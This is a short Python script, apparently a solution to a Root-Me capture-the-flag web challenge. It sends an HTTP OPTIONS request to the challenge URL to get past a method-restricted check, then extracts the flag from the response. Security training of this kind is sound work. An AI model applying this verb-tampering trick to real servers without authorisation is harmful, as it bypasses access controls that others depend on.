 
import re
import sys
import requests

URL = "http://challenge01.root-me.org/web-serveur/ch8/"

print("[*] Testing with OPTIONS method...")

try:
    response = requests.options(URL, timeout=5).text
except Exception:
    print("[x] Exploit completed, but no flag captured")
    sys.exit(1)

print("[+] Exploit completed")

flag = re.search(r"<h1>(.*)</h1>", response).groups()[0].split(":")[1].strip()

print(f"[+] Flag: {flag}")
